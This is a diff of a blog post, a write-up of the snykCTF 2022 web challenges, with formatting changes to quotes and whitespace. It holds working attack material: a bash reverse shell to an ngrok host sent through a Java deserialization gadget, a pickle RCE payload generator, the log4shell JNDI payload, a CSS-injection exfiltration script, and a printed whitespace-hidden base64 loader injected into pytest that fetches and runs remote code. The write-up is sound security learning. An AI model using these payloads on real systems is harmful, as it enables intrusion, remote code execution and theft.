@@ -1,88 +1,85 @@
 ---
-title: "snykCTF 2022 Writeup"
-date: "2022-12-23"
+title: 'snykCTF 2022 Writeup'
+date: '2022-12-23'
 tags: ['Writeup', 'Web']
 draft: false
-summary: "This is the writeup for the snykCTF 2022 which provided so many interesting web challenges. I take it as an opportunity to learn more about various web security topics which is why I spend time going through all the challenges again. I hope you find this writeup informative and enjoyable!"
+summary: 'This is the writeup for the snykCTF 2022 which provided so many interesting web challenges. I take it as an opportunity to learn more about various web security topics which is why I spend time going through all the challenges again. I hope you find this writeup informative and enjoyable!'
 ---
 
 This is the writeup for the snykCTF 2022 which provided so many interesting web challenges. I take it as an opportunity to learn more about various web security topics which is why I spend time going through all the challenges again. I hope you find this writeup informative and enjoyable!
 
-
-
 <table>
-    <tr>
-        <td>Category</td>
-        <td>Challenge</td>
-        <td>Description</td>
-    </tr>
-    <tr>
-        <td>Web</td>
-        <td>File Explorer</td>
-        <td>path traversal</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Treasure Trove</td>
-        <td>javascritp obfuscation by jsfuck</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>roadrunner</td>
-        <td>golang sandbox escape</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>git-ref</td>
-        <td>command injection in git</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>pay-attention</td>
-        <td>python obfuscation by Hyperion</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>pay-More-attention</td>
-        <td>python obfuscation by pyArmor</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Juggle Central</td>
-        <td>magic hash in php</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Serial Snyker</td>
-        <td>java deserialization vulnerability</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Organic Sauerkraut</td>
-        <td>pickle deserialization vulnerability</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Moon Goose</td>
-        <td>path traversal, prototype inheritance for authentication bypass, and NoSQL injection</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Logster</td>
-        <td>log4shell(cve-2021-44228)</td>
-    </tr>
-    <tr>
-        <td></td>
-        <td>Disposable Message</td>
-        <td>css injection</td>
-    </tr>
-    <tr>
-        <td>Misc</td>
-        <td>Potty Training</td>
-        <td>LSB stego</td>
-    </tr>
+  <tr>
+    <td>Category</td>
+    <td>Challenge</td>
+    <td>Description</td>
+  </tr>
+  <tr>
+    <td>Web</td>
+    <td>File Explorer</td>
+    <td>path traversal</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Treasure Trove</td>
+    <td>javascritp obfuscation by jsfuck</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>roadrunner</td>
+    <td>golang sandbox escape</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>git-ref</td>
+    <td>command injection in git</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>pay-attention</td>
+    <td>python obfuscation by Hyperion</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>pay-More-attention</td>
+    <td>python obfuscation by pyArmor</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Juggle Central</td>
+    <td>magic hash in php</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Serial Snyker</td>
+    <td>java deserialization vulnerability</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Organic Sauerkraut</td>
+    <td>pickle deserialization vulnerability</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Moon Goose</td>
+    <td>path traversal, prototype inheritance for authentication bypass, and NoSQL injection</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Logster</td>
+    <td>log4shell(cve-2021-44228)</td>
+  </tr>
+  <tr>
+    <td></td>
+    <td>Disposable Message</td>
+    <td>css injection</td>
+  </tr>
+  <tr>
+    <td>Misc</td>
+    <td>Potty Training</td>
+    <td>LSB stego</td>
+  </tr>
 </table>
-
 
 Hope you can still visit these challenges with `challenge-name.c.ctf-snyk.io`, for example, `file-explorer.c.ctf-snyk.io` for the File Explorer challenge.
 
@@ -90,9 +87,9 @@ Hope you can still visit these challenges with `challenge-name.c.ctf-snyk.io`, f
 
 ### File Explorer
 
->Expose hidden files in the web application.
+> Expose hidden files in the web application.
 >
->http://file-explorer.c.ctf-snyk.io/
+> http://file-explorer.c.ctf-snyk.io/
 
 source code but modified: https://github.com/lcrowther-snyk/file-explorer
 
@@ -110,9 +107,9 @@ https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt
 
 ### Treasure Trove
 
->The latest Treasure Trove is out, but where did I put my licence key!
+> The latest Treasure Trove is out, but where did I put my licence key!
 >
->http://treasure-trove.c.ctf-snyk.io/
+> http://treasure-trove.c.ctf-snyk.io/
 
 ```
 // obfuscator.js
@@ -129,7 +126,7 @@ const number = n => {
 const map = {};
 
 const fromString = s =>s.split('').map(x => {
-  // if the char is not in the 
+  // if the char is not in the
   if (!(x in map)) {
     const charCode = x.charCodeAt(0);
     return `([]+[])[${fromString('constructor')}][${fromString('fromCharCode')}](${number(charCode)})`;
@@ -204,17 +201,17 @@ func (s* Sandbox) sanitizeScript() (bool, error) {
 
 ### git-ref
 
->gitgitgit #ref
+> gitgitgit #ref
 >
->[http://git-refs.c.ctf-snyk.io](http://git-refs.c.ctf-snyk.io/)
+> [http://git-refs.c.ctf-snyk.io](http://git-refs.c.ctf-snyk.io/)
 
 ![git-refs-1](/static/images/snykCTF-2022-Writeup/git-refs-1.png)
 
->As you can tell, Git simply replaces the new command with whatever you alias it for. However, maybe you want to run an external command, rather than a Git subcommand. In that case, you start the command with a `!` character. This is useful if you write your own tools that work with a Git repository. We can demonstrate by aliasing `git visual` to run `gitk`:
+> As you can tell, Git simply replaces the new command with whatever you alias it for. However, maybe you want to run an external command, rather than a Git subcommand. In that case, you start the command with a `!` character. This is useful if you write your own tools that work with a Git repository. We can demonstrate by aliasing `git visual` to run `gitk`:
 >
->```console
->$ git config --global alias.visual '!gitk'
->```
+> ```console
+> $ git config --global alias.visual '!gitk'
+> ```
 
 ![git-refs-2](/static/images/snykCTF-2022-Writeup/git-refs-2.png)
 
@@ -222,9 +219,9 @@ func (s* Sandbox) sanitizeScript() (bool, error) {
 
 Next, we need to travel through the files and find where the flag is. Usually, the flag will be put in the following places:
 
-+ sensitive path, e.g. /etc/passwd, /etc/shadow, logs
-+ application path
-+ environment variables path
+- sensitive path, e.g. /etc/passwd, /etc/shadow, logs
+- application path
+- environment variables path
 
 A good way to draw the map of files that we might be interested in is to check the recently modified files by making use of the `find` command. We could use the `grep` command to find the flag in the content of every file in the system, but it might throw a timeout before outputting anything useful. So, we might need to narrow down the path to search.
 
@@ -258,16 +255,16 @@ Files pytest-7.1.3/src/_pytest/fixtures.py and pytest-7.1.3-synk/src/_pytest/fix
 Only in pytest-7.1.3-synk/src: pytest.egg-info
 ```
 
-When comparing the directory by `diff` command, the `-q` option should never be left over; otherwise, it only compares the files(directory name) in the current directory.  Then, we could remove the `-q` option to print the difference in detail.
+When comparing the directory by `diff` command, the `-q` option should never be left over; otherwise, it only compares the files(directory name) in the current directory. Then, we could remove the `-q` option to print the difference in detail.
 
 ```sh
-xxx@xxx:~/Desktop/synkCTF/PayAttention$ diff pytest-7.1.3-synk/src/_pytest/fixtures.py pytest-7.1.3/src/_pytest/fixtures.py 
+xxx@xxx:~/Desktop/synkCTF/PayAttention$ diff pytest-7.1.3-synk/src/_pytest/fixtures.py pytest-7.1.3/src/_pytest/fixtures.py
 424,426c424
-<         
-<                                                                                                                                                                                                                                                                                                                                         ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZgpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zcwoKX3R0bXAgPSBfZmYoZGVsZXRlPUZhbHNlKQpfdHRtcC53cml0ZShiIiIiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXU7ZXhlYyhfdXUoJ2h0dHA6Ly9wYXktYXR0ZW50aW9uLmMuY3RmLXNueWsuaW8vaW5qZWN0b3InKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzKGYie19lZX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','\x65\x78\x65\x63'))    
-<     
+<
+<                                                                                                                                                                                                                                                                                                                                         ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZgpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zcwoKX3R0bXAgPSBfZmYoZGVsZXRlPUZhbHNlKQpfdHRtcC53cml0ZShiIiIiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXU7ZXhlYyhfdXUoJ2h0dHA6Ly9wYXktYXR0ZW50aW9uLmMuY3RmLXNueWsuaW8vaW5qZWN0b3InKS5yZWFkKCkpIiIiKQpfdHRtcC5jbG9zZSgpCnRyeTogX3NzKGYie19lZX0ge190dG1wLm5hbWV9IikKZXhjZXB0OiBwYXNz"),'<string>','\x65\x78\x65\x63'))
+<
 ---
-> 
+>
 ```
 
 We could see that the `fixtures.py` has been injected a code segment which is encoded by base64 and hex.
@@ -299,7 +296,7 @@ Wow, look what we got! The flag has been decoded and assigned to a variable.
 
 ### pay-MORE-attention
 
-This challenge is a step forward than the pay-MORE-attention. After using the decompiler tool to extract the source code of the `pay.pyc`, I got a python code obfuscated by the PyArmor. 
+This challenge is a step forward than the pay-MORE-attention. After using the decompiler tool to extract the source code of the `pay.pyc`, I got a python code obfuscated by the PyArmor.
 
 According to the challenge author, he obfuscated the code with a strict mode that we are unable to see the objects and modules while using a debugger. He also introduced a built-in python library called `inspect` (and an extended library `rich`) to help us debug what does the object and functions like in the runtime. However, both approaches cannot find meaningful things in this challenge.
 
@@ -362,9 +359,9 @@ A PHP string is considered numeric if it can be interpreted as an int or a float
 
 > // from the official document
 >
-> Prior to PHP 8.0.0, if a string is compared to a number or a numeric string then the string was converted to a number before performing the comparison. 
+> Prior to PHP 8.0.0, if a string is compared to a number or a numeric string then the string was converted to a number before performing the comparison.
 
-However, based on my test, I found that only when both operands are numeric strings or one of them is a number and another is a numeric string, the conversion will take place.  
+However, based on my test, I found that only when both operands are numeric strings or one of them is a number and another is a numeric string, the conversion will take place.
 
 **magic hash in PHP**
 
@@ -375,7 +372,7 @@ In this challenge, we wish that the real password's hash is also numeric string 
 ```python
 import hashlib
 import random
- 
+
 target = '0e'
 
 def generate_random_str(randomlength=16):
@@ -400,7 +397,7 @@ while True:
                 print('username and password:' + plaintext);
                 break
     current_len += 1
-    
+
 ```
 
 ### SerialSnyker
@@ -459,7 +456,7 @@ public class IndexController {
 
 ```
 
-What makes this challenge not that hard is that the provided `ExecHelper` class is also serilizable, as it is inherited from `Serializable` class and has a `readObject` method which is the entry function that will be executed when the string is being deserialized to an object. This allows for the execution of arbitrary commands through the `ExecHelper` class. Otherwise, we need to find a gadgets chain that leads us from `readObject` to the execution context. 
+What makes this challenge not that hard is that the provided `ExecHelper` class is also serilizable, as it is inherited from `Serializable` class and has a `readObject` method which is the entry function that will be executed when the string is being deserialized to an object. This allows for the execution of arbitrary commands through the `ExecHelper` class. Otherwise, we need to find a gadgets chain that leads us from `readObject` to the execution context.
 
 ```java
 public class ExecHelper implements Serializable {
@@ -500,7 +497,7 @@ public class ExecHelper implements Serializable {
 
 ```
 
-To exploit this vulnerability, a customized `ExecHelper` object is created with the desired command to be executed, serialized into a string, and sent to the server as the `csrf token`. 
+To exploit this vulnerability, a customized `ExecHelper` object is created with the desired command to be executed, serialized into a string, and sent to the server as the `csrf token`.
 
 ```java
 package com.snykctf.serialsnyker;
@@ -542,13 +539,13 @@ class Main {
 }
 ```
 
-The `readObject` method of the `ExecHelper` class is then executed, allowing the specified command to be run on the server. In this case, the command `bash -i >& /dev/tcp/8.tcp.ngrok.io/18346 0>&1` was used to retrieve the flag. However, it was necessary to pass this command to the `bash -c` command in order to be recognized as a valid bash command by the Java code. In the end, I get to know where the flag is from the challenge's dockerfile so I just pass a `cat` command to print the flag. 
+The `readObject` method of the `ExecHelper` class is then executed, allowing the specified command to be run on the server. In this case, the command `bash -i >& /dev/tcp/8.tcp.ngrok.io/18346 0>&1` was used to retrieve the flag. However, it was necessary to pass this command to the `bash -c` command in order to be recognized as a valid bash command by the Java code. In the end, I get to know where the flag is from the challenge's dockerfile so I just pass a `cat` command to print the flag.
 
 ![](/static/images/snykCTF-2022-Writeup/serialsnyker-1.png)
 
 ### Organic sauerkraut
 
->What goes best on a hotdog this time?
+> What goes best on a hotdog this time?
 
 ```
 import requests
@@ -574,7 +571,7 @@ def generate_payload(cmd):
             # return os.system, (cmd,)
             import subprocess
             return subprocess.getoutput, (cmd,)
-    
+
     obj = {"name": PickleRCE()}
 
     payload = pickle.dumps(obj)
@@ -614,7 +611,7 @@ Initially, we thought the challenge was about NoSQL injection using MongoDB and 
 
 ![](/static/images/snykCTF-2022-Writeup/moongoose-1.png)
 
-Upon examining other APIs, we found that the `/api/image/` API serves images, while other static files are served from the root path of the website. When we tried to read arbitrary files within `/api/image/`, we received a message indicating that the backend was attempting to open the file without sanitizing the input, suggesting the possibility of a path traversal vulnerability. 
+Upon examining other APIs, we found that the `/api/image/` API serves images, while other static files are served from the root path of the website. When we tried to read arbitrary files within `/api/image/`, we received a message indicating that the backend was attempting to open the file without sanitizing the input, suggesting the possibility of a path traversal vulnerability.
 
 ```
 {"oops":{"errno":-2,"syscall":"open","code":"ENOENT","path":"/app/res/flag"}}
@@ -743,7 +740,7 @@ After a quick review, we lock the target on the `/api/flags` API. However, we st
 
 ```
 echo "\$2b\$1\$.zYQ7xW4JFZoj3GvhXS9gOAJs8CUUIbub80UHqfjO20h2sdJpjwDW" > hash.txt
-hashcat -a 0 -m 3200 -o output.txt hash.txt /usr/share/wordlists/rockyou.txt --force 
+hashcat -a 0 -m 3200 -o output.txt hash.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
 However, this returned a "Token length exception" error, indicating that the input is an invalid hash value. Upon further investigation, we discovered that the provided hash value is one character shorter than a normal bcrypt hash value, suggesting that a different version of `bcrypt` may be in use.
@@ -774,7 +771,7 @@ SNYK{92e21183e13585b514c25997a90031f0c3780c50ca822caa36b352d6e9d42de8}
 
 ### Logster
 
->lookup a jniorous shell
+> lookup a jniorous shell
 
 The challenge name and the keyword `lookup` and `shell` couldn't be more apparent in pointing us to us that this challenge is about log4shell(CVE-2021-44228).
 
@@ -796,11 +793,11 @@ To fully understand a vulnerability, it is often helpful to set up a proof of co
 
 The exploit steps summarised by in the [LunaSec blog](https://www.lunasec.io/docs/blog/log4j-zero-day/) are pretty reasonable.
 
->1. Data from the User gets sent to the server (via any protocol).
->2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
->3. The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
->4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
->5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
+> 1.  Data from the User gets sent to the server (via any protocol).
+> 2.  logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
+> 3.  The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
+> 4.  This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
+> 5.  This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
 
 **Back to the Logster challenge**
 
@@ -839,7 +836,7 @@ server_socket.bind((SERVER_HOST, SERVER_PORT))
 server_socket.listen(1)
 print('Listening on port %s ...' % SERVER_PORT)
 
-while True:    
+while True:
     # Wait for client connections
     client_connection, client_address = server_socket.accept()
 
@@ -867,9 +864,9 @@ This time works!
 
 To move to the next stage, we need to set up an attack server, such as an LDAP server and an HTTP server, to serve the exploit object. Since it can be difficult to build an LDAP server from scratch, we can use the exploit provided by https://github.com/Kirill89/log4shell-vulnerable-server-exploit.
 
-However, since we need three web services open simultaneously, I need to set up an `frp` on my server (ngrok only supports one tunnel at the same time as a `free` user). 
+However, since we need three web services open simultaneously, I need to set up an `frp` on my server (ngrok only supports one tunnel at the same time as a `free` user).
 
-Finally, My attack deployment is shown below. 
+Finally, My attack deployment is shown below.
 
 ![](/static/images/snykCTF-2022-Writeup/log4j-6.png)
 
@@ -901,24 +898,21 @@ Finally, we got the flag from the server.
 
 ### Disposable Message
 
-At my first glance at the challenge, I thought it was a reflective XSS challenge since there is a button for asking the admin bot to visit our page. However, after I tried some payloads, none of them successfully appeared on the rendered page, meaning they had all been sanitized. 
+At my first glance at the challenge, I thought it was a reflective XSS challenge since there is a button for asking the admin bot to visit our page. However, after I tried some payloads, none of them successfully appeared on the rendered page, meaning they had all been sanitized.
 
 Then, I try to examine the source code of the website. I found the following code snippet allowing us to inject a style tag into the page, indicating the vulnerability here is the `CSS injection`.
 
 ```html
 <script>
   if (window.location.search.startsWith('?color=')) {
-    localStorage.setItem(
-      'color',
-      decodeURIComponent(window.location.search.replace('?color=', ''))
-    );
+    localStorage.setItem('color', decodeURIComponent(window.location.search.replace('?color=', '')))
   }
 
-  const color = localStorage.getItem('color') || 'ffffff';
-  const style = document.createElement('style');
+  const color = localStorage.getItem('color') || 'ffffff'
+  const style = document.createElement('style')
 
-  style.innerText = `body {background-color: #${color};}`;
-  document.head.appendChild(style);
+  style.innerText = `body {background-color: #${color};}`
+  document.head.appendChild(style)
 </script>
 ```
 
@@ -940,9 +934,9 @@ In a typic CSS injection, where we can find our information from [OWASP.com](htt
 
 However, the website deploys a CSP policy that every file (img, script, css, html, ...) can only request from the origin domain, so our `attacker.com` would violate the adopted CSP policy and cannot be requested.
 
-`````
+```
 default-src 'self'; font-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/; frame-src 'self
-`````
+```
 
 Therefore, we need to find another way to indicate that we have guessed the correct part of the leaking information. The interesting part of this challenge is that our generated page is disposable and can only be visited once. This feature can be used as a binary switch to replace the URL for `attacker.com`.
 
@@ -961,7 +955,7 @@ def generate_disposable_links():
     # walk through alphabet
     for i in range(33, 126):
         char2link[chr(i)] = __generate_disposable_link("a disposable page for " + chr(i))[0]
-    
+
     return char2link
 
 def __generate_disposable_link(message):
@@ -980,7 +974,7 @@ def __generate_disposable_link(message):
 def main():
     ROOT_URL = "http://disposable-message.c.ctf-snyk.io"
     FLAG = ""
-    
+
     while True:
         # initalize the disposable links
         char2link = generate_disposable_links()
@@ -988,7 +982,7 @@ def main():
         # generate css injected link for each char in the alphabet, ask admin bot to visit, and check the disposable link
         for char, link in char2link.items():
             new_test_url = __generate_disposable_link("a disposable page for " + char)[1]
-            
+
             payload = new_test_url + quote_plus("?color=ffffff}" + f'div[data-flag^="{FLAG+char}"]{{background:url("{link}");}}')
 
             requests.post(ROOT_URL+payload)
@@ -1002,9 +996,9 @@ def main():
                 FLAG += char
                 print("[+] Wow! Current flag: %s" % FLAG)
                 break
-        
+
 if __name__ == "__main__":
-      main()  
+      main()
 ```
 
 However, it should be noted that payload works successfully on the `/view` but not on the `/admin-bot/` currently. I also test the script given by the official writeup, which also doesn't work for now.
@@ -1015,7 +1009,7 @@ But the success on `/view` with custom cookie as the flag shows that there is no
 
 ### Potty Training
 
->Sponsored by stegano
+> Sponsored by stegano
 
 ![potty](/static/images/snykCTF-2022-Writeup/potty.png)
 
@@ -1025,10 +1019,9 @@ LSB Stego
 
 ```
 # Extracted embedded code
-import requests          
-r = requests.get('https://potty-training.c.ctf-snyk.io/')         
+import requests
+r = requests.get('https://potty-training.c.ctf-snyk.io/')
 print(r.text)
 ```
 
 ![PottyTraining](/static/images/snykCTF-2022-Writeup/PottyTraining.png)
-
